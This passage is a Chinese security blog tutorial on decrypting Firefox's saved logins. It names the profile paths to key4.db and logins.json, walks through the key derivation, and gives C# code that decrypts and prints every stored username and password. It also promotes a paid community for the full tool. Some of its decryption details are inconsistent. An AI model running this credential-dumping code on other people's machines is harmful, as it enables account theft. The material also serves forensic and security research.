@@ -1,0 +1,301 @@
+## Firefox中导出明文密码
+
+和Chrome浏览器不同，Mozilla拥有自己的加密库，被称为[网络安全服务（NSS）](https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS)，特别之处是NSS使用了[ASN.1](https://en.wikipedia.org/wiki/Abstract_Syntax_Notation_One)进行数据序列化。
+
+> ASN1
+>
+>   * ASN.1 – Abstract Syntax Notation dot
+> one，数字1被ISO加在ASN的后边，是为了保持ASN的开放性，可以让以后功能更加强大的ASN被命名为ASN.2等，但至今也没有出现。
+>
+>   *
+> ASN.1是一种对数据进行表示、编码、传输和解码的数据格式。它提供了一整套正规的格式用于描述对象的结构，而不管语言上如何执行及这些数据的具体指代，也不用去管到底是什么样的应用程序。
+>
+>
+
+Chrome和Firefox之间的有一个很大的区别，那就是Firefox允许用户提供一个主密码来加密所有存储的登录名和密码。如果用户设置了主密码，需要解密者提供主密码才能解密登录信息。
+
+![image](https://image.3001.net/images/20210622/1624347416_60d193182e73835fa4d1d.png!small)
+
+项目大量参考了https://github.com/lclevy/firepwd，以及下面这张Firefox的密码加解密流程图（原图地址为https://github.com/lclevy/firepwd/blob/master/mozilla_pbe.pdf），虽然是Firefox
+<32 版本的加密逻辑，但是可以帮助我们理清Firefox的加解密原理：
+
+![image](https://image.3001.net/images/20210622/1624347423_60d1931f971a8b1c8d330.png!small)
+
+### 登录信息存放位置
+
+用户的Firefox各种配置文件存储在自己的Appdata\Roaming目录下：
+
+    
+    
+    C:\Users\admin\AppData\Roaming\Firefox\Profiles\<random text>.default\
+    
+
+不同版本的Firefox浏览器，存放登录信息文件和存放密钥文件也不同，其中用到的加密方式也有少许不同：
+
+    
+    
+    Firefox 版本 <32 (key3.db, signons.sqlite)
+    Firefox 版本 >=32 (key3.db, logins.json)
+    Firefox 版本 >=58.0.2 (key4.db, logins.json)
+    Firefox 版本 >=75.0 (sha1 pbkdf2 sha256 aes256 cbc used by key4.db, logins.json)
+    
+
+如果Firefox 版本 >=58.0.2 那么接下来需要找的两个文件路径分别是：
+
+    
+    
+    C:\Users\admin\AppData\Roaming\Firefox\Profiles\<random text>.default\key4.db
+    C:\Users\admin\AppData\Roaming\Firefox\Profiles\<random text>.default\logins.json
+    
+
+### 登录信息存储过程
+
+以Firefox 版本
+>=58.0.2为例，`logins.json`将用户所有登录信息（包括URL，用户名，密码和其他元数据）存储为JSON。值得注意的是，这些文件中的用户名和密码均经过3DES加密，然后经过ASN.1编码，最后写入base64编码的文件中，用一个测试登录信息如下所示，其中encryptedUsername和encryptedPassword就是被加密的用户名和密码：
+
+    
+    
+    {
+        "nextId": 2, 
+        "logins": [
+            {
+                "id": 1, 
+                "hostname": "http://192.168.18.1", 
+                "httpRealm": null, 
+                "formSubmitURL": "http://192.168.18.1", 
+                "usernameField": "", 
+                "passwordField": "Password", 
+                "encryptedUsername": "MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNTQR/CqIN2qBAjp5XcZcmuibQ==", 
+                "encryptedPassword": "MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDUjhaRWzib+BBAUX/D1mTMqeccCSRJCkEbA", 
+                "guid": "{b82c4d25-5fc6-47bc-8c31-b1bbeaff0807}", 
+                "encType": 1, 
+                "timeCreated": 1618124482800, 
+                "timeLastUsed": 1618124482800, 
+                "timePasswordChanged": 1618124482800, 
+                "timesUsed": 1
+            }
+        ], 
+        "potentiallyVulnerablePasswords": [ ], 
+        "dismissedBreachAlertsByLoginGUID": { }, 
+        "version": 3
+    }
+    
+
+`key4.db`是一个sqlite数据库，里面存储用于3DES解密`logins.json`的密钥，以及被加密的用于验证主密钥解密的`password-check`值，里面有两个表metaData和nssPrivate，
+
+metaData中id为password的item1列为包含加密期间使用的 **全局盐值(globalSalt)**
+；item2列为ASN.1编码后的加密password-check数据，里面包含被加密的password-check字符串和用于加密的
+**入口盐值(entrySalt)** 。
+
+![image](https://image.3001.net/images/20210622/1624347436_60d1932c2ce9da85c31cc.png!small)
+
+nssPrivate中 **a11** 列存放的是用于加解密的主密钥。
+
+![image](https://image.3001.net/images/20210622/1624347442_60d193328151befff3281.png!small)
+
+### 登录信息解密
+
+#### Firefox 版本 >= 58.0.2 < 75
+
+  1. 根据上述的描述，解密Firefox存储在本地的登录信息需要以下步骤：
+
+  2. 找到当前计算机Firefox的profile目录，检查`key4.db`和`logins.json`文件是否存在。
+
+  3. 如果存在，从`key4.db`中提取已编码+加密的password-check数据，先ASN1解码然后使用3DES解密被加密的password-check字符串（这样做是为了确认提取的密码是否正确）。
+
+  4. 从`key4.db`中提取编码的+加密的主密钥 ，ASN.1解码，然后3DES解密主密钥。
+
+  5. 从`logins.json`中读取加密的登录名和密码，ASN.1解码，然后3DES使用主密钥解密登录数据
+
+#### Firefox 版本 >= 75
+
+和Firefox 版本 >= 58.0.2 < 75不同的是，在加密password-check数据和主密钥使用了`hmacWithSHA256`的哈希算法和`AES256 cbc`的加密算法，所以解密步骤如下所示：
+
+  1. 根据上述的描述，解密Firefox存储在本地的登录信息需要以下步骤：
+
+  2. 找到当前计算机Firefox的profile目录，检查`key4.db`和`logins.json`文件是否存在。
+
+  3. 如果存在，从`key4.db`中提取已编码+加密的password-check数据，先ASN1解码然后使用AES解密被加密的password-check字符串（这样做是为了确认提取的密码是否正确）。
+
+  4. 从`key4.db`中提取编码的+加密的主密钥 ，ASN.1解码，然后3DES解密主密钥。
+
+  5. 从`logins.json`中读取加密的登录名和密码，ASN.1解码，然后3DES使用主密钥解密登录数据
+
+以Firefox 版本 >= 75为例，下面以项目部分代码为例讲下实现细节：
+
+为了快速实现ASN1解码，AES和3DES的解密，使用了大佬们github的开源项目代码，链接放在最后的参考文章上，如果想深入了解ASN1的原理可以参考[ASN.1
+DER（可分辨编码规则）](https://docs.microsoft.com/en-us/windows/win32/seccertenroll/about-der-encoding-of-asn-1-types)等文章，Firefox的ASN.1使用[TLV（类型，长度，值）](https://en.wikipedia.org/wiki/Type-length-value)数据格式，数据仅使用少量的DER数据类型，这使得解码变得更加容易，TLV格式如下所示：
+
+    
+    
+    public enum Type
+    {
+    	Sequence = 0x30,
+    	Integer = 0x02,
+    	BitString = 0x03,
+    	OctetString = 0x04,
+    	Null = 0x05,
+    	ObjectIdentifier = 0x06
+    }
+    
+
+为了判断ASN1中ObjectIdentifier代表的加密方式，使用[firepwd项目](https://github.com/lclevy/firepwd)中提供的oid对应字典，具体编号对应参考http://oid-info.com/get/1.2.840.113549.2.9：
+
+    
+    
+    public static Dictionary<string, string> oidValues = new Dictionary<string, string>
+    {
+    	{ "2A864886F70D010C050103","1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC" },
+    	{ "2A864886F70D0307","1.2.840.113549.3.7 des-ede3-cbc" },
+    	{ "2A864886F70D010101","1.2.840.113549.1.1.1 pkcs-1" },
+    	{ "2A864886F70D01050D","1.2.840.113549.1.5.13 pkcs5 pbes2" },
+    	{ "2A864886F70D01050C","1.2.840.113549.1.5.12 pkcs5 PBKDF2" },
+    	{ "2A864886F70D0209","1.2.840.113549.2.9 hmacWithSHA256" },
+    	{ "60864801650304012A","2.16.840.1.101.3.4.1.42 aes256-CBC" }
+    };
+    
+
+解析出来的结果样例为：
+
+    
+    
+    SEQUENCE {
+    SEQUENCE {
+    SEQUENCE {
+            OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
+    SEQUENCE {
+    SEQUENCE {
+            OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
+    SEQUENCE {
+            OCTETSTRING 947EB49963185BD83E2BD77C074A4A982832515E775AC7B23577F15401E905BD
+            INTEGER 01
+            INTEGER 20
+    SEQUENCE {
+            OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
+            OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
+            OCTETSTRING 6C567DBF5EEC60AF7D2FB363035F
+            OCTETSTRING 140D0C287323E3C1B404157C92973A17
+            OCTETSTRING 140D0C287323E3C1B404157C92973A17
+    }
+    SEQUENCE {
+    }
+            OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
+            OCTETSTRING 6C567DBF5EEC60AF7D2FB363035F
+            OCTETSTRING 140D0C287323E3C1B404157C92973A17
+    }
+    SEQUENCE {
+    }
+            OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
+            OCTETSTRING 6C567DBF5EEC60AF7D2FB363035F
+            OCTETSTRING 140D0C287323E3C1B404157C92973A17
+    }
+    SEQUENCE {
+    }
+            OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
+            OCTETSTRING 6C567DBF5EEC60AF7D2FB363035F
+            OCTETSTRING 140D0C287323E3C1B404157C92973A17
+    }
+            OCTETSTRING 140D0C287323E3C1B404157C92973A17
+    }
+            OCTETSTRING 140D0C287323E3C1B404157C92973A17
+    }
+    }
+    
+
+ASN.1解析器类将ASN.1编码的BLOB递归地解析为一个对象。每个对象都包含一个对象列表，这些`Sequence`对象代表处理编码的登录数据和主密钥的情况，通过oid得知加密方法后，从解析器里提取entrySalt，iterationCount，keyLength。之后先获取globalSalt的sha1加密值，和entrySalt一起做hmacWithSHA256加密来获取密钥，最后提取cipherT做AES解密，通过decryptPEB函数可以获取解密后的password-check字符串和主密钥，代码如下所示：
+
+    
+    
+    else if(pbeAlgo.Contains("1.2.840.113549.1.5.13"))
+    {
+        byte[] entrySalt = asn.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;
+        int iterationCount = asn.objects[0].objects[0].objects[1].objects[0].objects[1].objects[1].Data[0];
+        int keyLength = asn.objects[0].objects[0].objects[1].objects[0].objects[1].objects[2].Data[0];
+    
+        byte[] k = SHA1.Create().ComputeHash(globalSalt);
+        var hmac = new HMACSHA256();
+        var df = new Pbkdf2(hmac, k, entrySalt, iterationCount);
+        byte[] key = df.GetBytes(32);
+        Console.WriteLine(BitConverter.ToString(key));
+        byte[] source = { 0x4, 0xe };
+        byte[] iv = byteCpy(source, asn.objects[0].objects[0].objects[1].objects[2].objects[1].Data);
+        Console.WriteLine(BitConverter.ToString(iv));
+        byte[] cipherT = asn.objects[0].objects[1].Data;
+        Console.WriteLine(BitConverter.ToString(cipherT));
+        byte[] clearText = AESDecrypt(cipherT, key, iv);
+        return clearText;
+    }
+    
+
+现在剩下的就是使用密钥和IV执行3DES解密登录信息了，读取`logins.json`文件
+
+>   1. 遍历中的每个`Login`对象`JSONLogins`
+>
+>   2. ASN.1解码每个用户名和密码
+>
+>   3. 3DES使用主密钥解密每个用户名和密码
+>
+>   4. 输出hostname，username，password
+>
+>
+
+    
+    
+    FFLogins ffLoginData;
+    using (StreamReader sr = new StreamReader(userFireFoxloginPath))
+    {
+        string json = sr.ReadToEnd();
+        ffLoginData = JsonConvert.DeserializeObject<FFLogins>(json);
+    }
+    
+    foreach (LoginData loginData in ffLoginData.logins)
+    {
+        try
+        {
+            Asn1DerObject user = asn.Parse(Convert.FromBase64String(loginData.encryptedUsername));
+            Asn1DerObject pwd = asn.Parse(Convert.FromBase64String(loginData.encryptedPassword));
+            string hostname = loginData.hostname;
+            string decryptedUser = TripleDESHelper.DESCBCDecryptor(privateKey, user.objects[0].objects[1].objects[1].Data, user.objects[0].objects[2].Data);
+            string decryptedPwd = TripleDESHelper.DESCBCDecryptor(privateKey, pwd.objects[0].objects[1].objects[1].Data, pwd.objects[0].objects[2].Data);
+            string username = Regex.Replace(decryptedUser, @"[^\u0020-\u007F]", "");
+            string password = Regex.Replace(decryptedPwd, @"[^\u0020-\u007F]", "");
+    
+            Console.WriteLine(hostname);
+            Console.WriteLine(username);
+            Console.WriteLine(password);
+            Console.WriteLine("");
+        }
+        catch(Exception e)
+        {
+            Console.WriteLine(e);
+        }
+    }
+    
+
+最终结果如下图所示：
+
+![image](https://image.3001.net/images/20210622/1624347456_60d19340e0aef10f60f24.png!small)
+
+工具加入知识星球获取，现在只是个基础，后期会逐步更新所有浏览器的解密工具，还不加入星球一起快乐击剑？
+
+我正在「宽字节安全」和朋友们讨论有趣的话题，你⼀起来吧？  
+https://t.zsxq.com/qJe2JEi
+
+### 参考文章
+
+>   * ASN1 介绍 https://www.jianshu.com/p/44e6a9e1fbe2
+>
+>   * https://github.com/lclevy/firepwd
+>
+>   * http://oid-info.com/get/1.2.840.113549.2.9
+>
+>   * https://github.com/gourk/FirePwd.Net
+>
+>   * https://apr4h.github.io/2019-12-20-Harvesting-Browser-Credentials/
+>
+>   * https://github.com/djhohnstein/SharpWeb
+>
+>
+
+  
+
